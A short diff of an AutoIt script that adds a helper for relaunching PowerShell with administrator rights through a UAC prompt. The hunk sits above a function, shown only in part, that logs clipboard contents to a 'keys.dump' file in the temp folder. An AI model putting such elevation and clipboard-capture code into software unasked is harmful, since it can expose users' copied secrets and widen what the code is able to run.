@@ -11,6 +11,14 @@ Func MessageBox($title, $text)
    MsgBox($MB_SYSTEMMODAL, $title, $text , 10)
 EndFunc
 
+;Run powershell command with elevated permissions UAC
+Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";')
+   $buffer01 = "powershell.exe -Command ";
+   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
+   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
+   RunWait($buffer00);
+EndFunc
+
 ;Log to file the data stored in the clipboard
 Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump")
    $buffer=""
